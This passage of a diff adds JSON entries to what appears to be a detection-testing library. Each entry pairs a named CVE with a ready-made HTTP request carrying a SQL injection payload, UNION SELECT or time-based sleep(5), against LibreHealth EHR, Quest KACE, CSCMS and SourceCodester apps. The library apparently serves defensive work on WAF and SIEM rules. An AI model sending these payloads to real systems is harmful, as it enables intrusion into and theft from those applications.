+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29979",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/simple-client-management-system/SQLi-6.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29938 - LibreHealth EHR SQL Injection",
+    "displayName": "CVE-2022-29938 - LibreHealth EHR SQL Injection",
+    "description": "LibreHealth EHR 2.0.0 lacks sanitization of the GET parameter payment_id in interface/billing/new_payment.php (via payment_master.inc.php), leading to SQL injection. The request sends a UNION SELECT payload in payment_id. No vendor WAF rule found; built from the advisory.\n\nReferences used to recreate this request:\n- https://nitroteam.kz/index.php?action=researches&slug=librehealth_r (research write-up / PoC)\n- https://gitlab.com/librehealth/ehr/lh-ehr/-/tags (fix reference)\n- https://www.cve.org/CVERecord?id=CVE-2022-29938 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /interface/billing/new_payment.php?payment_id=-1%27%20UNION%20SELECT%201,2,3,4,5,6,7--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29938"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_research for CVE-2022-29938",
+        "link": "https://nitroteam.kz/index.php?action=researches&slug=librehealth_r"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29807 - Quest KACE Systems Management Appliance SQL Injection",
+    "displayName": "CVE-2022-29807 - Quest KACE Systems Management Appliance SQL Injection",
+    "description": "Quest KACE Systems Management Appliance (SMA) through 12.0 is vulnerable to SQL injection in common/download_agent_installer.php, reachable pre-authentication via the orgid query parameter (the PoC appends the injection to ?platform=windows&version=1&orgid=1). The request sends a UNION SELECT payload in orgid. No vendor WAF rule found; built from the public exploit (jeffssh/KACE-SMA-RCE).\n\nReferences used to recreate this request:\n- https://github.com/jeffssh/KACE-SMA-RCE (PoC / exploit, endpoint /common/download_agent_installer.php, orgid injection)\n- https://support.quest.com/kb/338162 (vendor advisory)\n- https://www.cve.org/CVERecord?id=CVE-2022-29807 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /common/download_agent_installer.php?platform=windows&version=1&orgid=1%27%20UNION%20SELECT%201,2,3--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29807"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29807",
+        "link": "https://github.com/jeffssh/KACE-SMA-RCE"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29751 - SourceCodester Simple Client Management System SQL Injection",
+    "displayName": "CVE-2022-29751 - SourceCodester Simple Client Management System SQL Injection",
+    "description": "SourceCodester Simple Client Management System 1.0 is vulnerable to SQL injection in the id argument handled by the delete_client function of classes/Master.php (Master.php?f=delete_client). The request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the PoC. HTTP method (GET) inferred for the delete action and flagged.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/simple-client-management-system/SQLi-5.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29751 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /cms/classes/Master.php?f=delete_client&id=-1%27%20UNION%20SELECT%201,2,3,4,5,6,7--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29751"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29751",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/simple-client-management-system/SQLi-5.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29750 - SourceCodester Simple Client Management System SQL Injection",
+    "displayName": "CVE-2022-29750 - SourceCodester Simple Client Management System SQL Injection",
+    "description": "SourceCodester Simple Client Management System 1.0 is vulnerable to SQL injection in the id argument handled by the delete_service function of classes/Master.php (Master.php?f=delete_service). The request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the PoC. HTTP method (GET) inferred for the delete action and flagged.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/simple-client-management-system/SQLi-3.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29750 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /cms/classes/Master.php?f=delete_service&id=-1%27%20UNION%20SELECT%201,2,3,4,5,6,7--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29750"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29750",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/simple-client-management-system/SQLi-3.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2026-6191 - itsourcecode Construction Management System SQL Injection",
     "displayName": "CVE-2026-6191 - itsourcecode Construction Management System SQL Injection",
     "description": "itsourcecode Construction Management System 1.0 is vulnerable to SQL injection via the Name parameter of /equipments.php. The request submits a boolean-based SQL injection payload in the Name field. No vendor WAF rule found; the GitHub issue PoC was unreachable (provenance-blocked), so this is built from the VulDB file/argument entry point and the itsourcecode add-record form pattern (method inferred as POST).\n\nReferences used to recreate this request:\n- https://github.com/ltranquility/cve_submit/issues/16 (PoC - unreachable)\n- https://vuldb.com/vuln/357113 (VulDB entry: file /equipments.php, argument Name)\n- https://vulnerability.circl.lu/vuln/cve-2026-6191 (CIRCL/CVE record)",
@@ -368447,6 +370376,546 @@
       {
         "title": "source_confirm for CVE-2026-6163",
         "link": "https://github.com/nishanb/Lostandfound"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29687 - CSCMS Music Portal System v4.2 SQL Injection",
+    "displayName": "CVE-2022-29687 - CSCMS Music Portal System v4.2 SQL Injection",
+    "description": "CSCMS Music Portal System v4.2 is vulnerable to blind (time-based) SQL injection in the id[] parameter at /admin.php/user/level_del (admin-authenticated). The request sends a time-based SQLi payload (sleep(5)) matching the vendor-issue PoC, triggering OWASP CRS 942 (SQL injection). Method POST/GET confirmed from the PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/chshcms/cscms/issues/30#issue-1209049714 (PoC: vendor GitHub issue with full HTTP request)\n- https://www.cve.org/CVERecord?id=CVE-2022-29687 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin.php/user/level_del HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nCookie: cscms_admin_id=dummy; cscms_session=dummy\n\nid[]=(sleep(5))\n"
+    },
+    "cves": [
+      "CVE-2022-29687"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29687",
+        "link": "https://github.com/chshcms/cscms/issues/30#issue-1209049714"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29686 - CSCMS Music Portal System v4.2 SQL Injection",
+    "displayName": "CVE-2022-29686 - CSCMS Music Portal System v4.2 SQL Injection",
+    "description": "CSCMS Music Portal System v4.2 is vulnerable to blind (time-based) SQL injection in the id[] parameter at /admin.php/singer/admin/lists/zhuan (admin-authenticated). The request sends a time-based SQLi payload (sleep(5)) matching the vendor-issue PoC, triggering OWASP CRS 942 (SQL injection). Method POST/GET confirmed from the PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/chshcms/cscms/issues/29#issue-1209046027 (PoC: vendor GitHub issue with full HTTP request)\n- https://www.cve.org/CVERecord?id=CVE-2022-29686 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin.php/singer/admin/lists/zhuan HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nCookie: cscms_admin_id=dummy; cscms_session=dummy\n\nid[]=(sleep(5))&cid=5\n"
+    },
+    "cves": [
+      "CVE-2022-29686"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29686",
+        "link": "https://github.com/chshcms/cscms/issues/29#issue-1209046027"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29685 - CSCMS Music Portal System v4.2 SQL Injection",
+    "displayName": "CVE-2022-29685 - CSCMS Music Portal System v4.2 SQL Injection",
+    "description": "CSCMS Music Portal System v4.2 is vulnerable to blind (time-based) SQL injection in the xid[1] parameter at /admin.php/User/level_sort (admin-authenticated). The request sends a time-based SQLi payload (sleep(5)) matching the vendor-issue PoC, triggering OWASP CRS 942 (SQL injection). Method POST/GET confirmed from the PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/chshcms/cscms/issues/32#issue-1209054307 (PoC: vendor GitHub issue with full HTTP request)\n- https://www.cve.org/CVERecord?id=CVE-2022-29685 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin.php/User/level_sort HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nCookie: cscms_admin_id=dummy; cscms_session=dummy\n\nxid[1]=(sleep(5))\n"
+    },
+    "cves": [
+      "CVE-2022-29685"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29685",
+        "link": "https://github.com/chshcms/cscms/issues/32#issue-1209054307"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29684 - CSCMS Music Portal System v4.2 SQL Injection",
+    "displayName": "CVE-2022-29684 - CSCMS Music Portal System v4.2 SQL Injection",
+    "description": "CSCMS Music Portal System v4.2 is vulnerable to blind (time-based) SQL injection in the id[] parameter at /admin.php/Label/js_del (admin-authenticated). The request sends a time-based SQLi payload (sleep(5)) matching the vendor-issue PoC, triggering OWASP CRS 942 (SQL injection). Method POST/GET confirmed from the PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/chshcms/cscms/issues/33#issue-1209055493 (PoC: vendor GitHub issue with full HTTP request)\n- https://www.cve.org/CVERecord?id=CVE-2022-29684 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin.php/Label/js_del HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nCookie: cscms_admin_id=dummy; cscms_session=dummy\n\nid[]='or+(sleep(5))#\n"
+    },
+    "cves": [
+      "CVE-2022-29684"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29684",
+        "link": "https://github.com/chshcms/cscms/issues/33#issue-1209055493"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29683 - CSCMS Music Portal System v4.2 SQL Injection",
+    "displayName": "CVE-2022-29683 - CSCMS Music Portal System v4.2 SQL Injection",
+    "description": "CSCMS Music Portal System v4.2 is vulnerable to blind (time-based) SQL injection in the id[] parameter at /admin.php/Label/page_del (admin-authenticated). The request sends a time-based SQLi payload (sleep(5)) matching the vendor-issue PoC, triggering OWASP CRS 942 (SQL injection). Method POST/GET confirmed from the PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/chshcms/cscms/issues/34#issue-1209056912 (PoC: vendor GitHub issue with full HTTP request)\n- https://www.cve.org/CVERecord?id=CVE-2022-29683 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin.php/Label/page_del HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nCookie: cscms_admin_id=dummy; cscms_session=dummy\n\nid[]='or+(sleep(5))#\n"
+    },
+    "cves": [
+      "CVE-2022-29683"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29683",
+        "link": "https://github.com/chshcms/cscms/issues/34#issue-1209056912"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29682 - CSCMS Music Portal System v4.2 SQL Injection",
+    "displayName": "CVE-2022-29682 - CSCMS Music Portal System v4.2 SQL Injection",
+    "description": "CSCMS Music Portal System v4.2 is vulnerable to blind (time-based) SQL injection in the id parameter at /admin.php/vod/admin/topic/del (admin-authenticated). The request sends a time-based SQLi payload (sleep(5)) matching the vendor-issue PoC, triggering OWASP CRS 942 (SQL injection). Method POST/GET confirmed from the PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/chshcms/cscms/issues/36#issue-1209060196 (PoC: vendor GitHub issue with full HTTP request)\n- https://www.cve.org/CVERecord?id=CVE-2022-29682 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin.php/vod/admin/topic/del HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nCookie: cscms_admin_id=dummy; cscms_session=dummy\n\nid=3)and(sleep(5))--+\n"
+    },
+    "cves": [
+      "CVE-2022-29682"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29682",
+        "link": "https://github.com/chshcms/cscms/issues/36#issue-1209060196"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29681 - CSCMS Music Portal System v4.2 SQL Injection",
+    "displayName": "CVE-2022-29681 - CSCMS Music Portal System v4.2 SQL Injection",
+    "description": "CSCMS Music Portal System v4.2 is vulnerable to blind (time-based) SQL injection in the id[] parameter at /admin.php/Links/del (admin-authenticated). The request sends a time-based SQLi payload (sleep(5)) matching the vendor-issue PoC, triggering OWASP CRS 942 (SQL injection). Method POST/GET confirmed from the PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/chshcms/cscms/issues/35#issue-1209058818 (PoC: vendor GitHub issue with full HTTP request)\n- https://www.cve.org/CVERecord?id=CVE-2022-29681 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin.php/Links/del HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nCookie: cscms_admin_id=dummy; cscms_session=dummy\n\nid[]=(sleep(5))\n"
+    },
+    "cves": [
+      "CVE-2022-29681"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29681",
+        "link": "https://github.com/chshcms/cscms/issues/35#issue-1209058818"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29680 - CSCMS Music Portal System v4.2 SQL Injection",
+    "displayName": "CVE-2022-29680 - CSCMS Music Portal System v4.2 SQL Injection",
+    "description": "CSCMS Music Portal System v4.2 is vulnerable to blind (time-based) SQL injection in the id[] parameter at /admin.php/user/zu_del (admin-authenticated). The request sends a time-based SQLi payload (sleep(5)) matching the vendor-issue PoC, triggering OWASP CRS 942 (SQL injection). Method POST/GET confirmed from the PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/chshcms/cscms/issues/31#issue-1209052957 (PoC: vendor GitHub issue with full HTTP request)\n- https://www.cve.org/CVERecord?id=CVE-2022-29680 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin.php/user/zu_del HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nCookie: cscms_admin_id=dummy; cscms_session=dummy\n\nid[]=(sleep(5))\n"
+    },
+    "cves": [
+      "CVE-2022-29680"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29680",
+        "link": "https://github.com/chshcms/cscms/issues/31#issue-1209052957"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29676 - CSCMS Music Portal System v4.2 SQL Injection",
+    "displayName": "CVE-2022-29676 - CSCMS Music Portal System v4.2 SQL Injection",
+    "description": "CSCMS Music Portal System v4.2 is vulnerable to blind (time-based) SQL injection in the id[] parameter at /admin.php/pic/admin/lists/zhuan (admin-authenticated). The request sends a time-based SQLi payload (sleep(5)) matching the vendor-issue PoC, triggering OWASP CRS 942 (SQL injection). Method POST/GET confirmed from the PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/chshcms/cscms/issues/24#issue-1207646618 (PoC: vendor GitHub issue with full HTTP request)\n- https://www.cve.org/CVERecord?id=CVE-2022-29676 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin.php/pic/admin/lists/zhuan HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nCookie: cscms_admin_id=dummy; cscms_session=dummy\n\nid[]=(sleep(5))&cid=5\n"
+    },
+    "cves": [
+      "CVE-2022-29676"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29676",
+        "link": "https://github.com/chshcms/cscms/issues/24#issue-1207646618"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29670 - CSCMS Music Portal System v4.2 SQL Injection",
+    "displayName": "CVE-2022-29670 - CSCMS Music Portal System v4.2 SQL Injection",
+    "description": "CSCMS Music Portal System v4.2 is vulnerable to blind (time-based) SQL injection in the id parameter at /admin.php/pic/admin/type/del (admin-authenticated). The request sends a time-based SQLi payload (sleep(5)) matching the vendor-issue PoC, triggering OWASP CRS 942 (SQL injection). Method POST/GET confirmed from the PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/chshcms/cscms/issues/21#issue-1207638326 (PoC: vendor GitHub issue with full HTTP request)\n- https://www.cve.org/CVERecord?id=CVE-2022-29670 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin.php/pic/admin/type/del?yid=3 HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nCookie: cscms_admin_id=dummy; cscms_session=dummy\n\nid=4)and(sleep(5))--+\n"
+    },
+    "cves": [
+      "CVE-2022-29670"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29670",
+        "link": "https://github.com/chshcms/cscms/issues/21#issue-1207638326"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29669 - CSCMS Music Portal System v4.2 SQL Injection",
+    "displayName": "CVE-2022-29669 - CSCMS Music Portal System v4.2 SQL Injection",
+    "description": "CSCMS Music Portal System v4.2 is vulnerable to blind (time-based) SQL injection in the id[] parameter at /admin.php/news/admin/lists/zhuan (admin-authenticated). The request sends a time-based SQLi payload (sleep(5)) matching the vendor-issue PoC, triggering OWASP CRS 942 (SQL injection). Method POST/GET confirmed from the PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/chshcms/cscms/issues/20#issue-1207634969 (PoC: vendor GitHub issue with full HTTP request)\n- https://www.cve.org/CVERecord?id=CVE-2022-29669 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin.php/news/admin/lists/zhuan HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nCookie: cscms_admin_id=dummy; cscms_session=dummy\n\nid[]=(sleep(5))&cid=5\n"
+    },
+    "cves": [
+      "CVE-2022-29669"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29669",
+        "link": "https://github.com/chshcms/cscms/issues/20#issue-1207634969"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29667 - CSCMS Music Portal System v4.2 SQL Injection",
+    "displayName": "CVE-2022-29667 - CSCMS Music Portal System v4.2 SQL Injection",
+    "description": "CSCMS Music Portal System v4.2 is vulnerable to blind (time-based) SQL injection in the id parameter at /admin.php/pic/admin/pic/hy (admin-authenticated). The request sends a time-based SQLi payload (sleep(5)) matching the vendor-issue PoC, triggering OWASP CRS 942 (SQL injection). Method POST/GET confirmed from the PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/chshcms/cscms/issues/26#issue-1207651726 (PoC: vendor GitHub issue with full HTTP request)\n- https://www.cve.org/CVERecord?id=CVE-2022-29667 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /admin.php/pic/admin/pic/hy?id=3)and(sleep(5))--+ HTTP/1.1\nHost: {{target_host}}\nCookie: cscms_admin_id=dummy; cscms_session=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29667"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29667",
+        "link": "https://github.com/chshcms/cscms/issues/26#issue-1207651726"
       }
     ],
     "public": false,
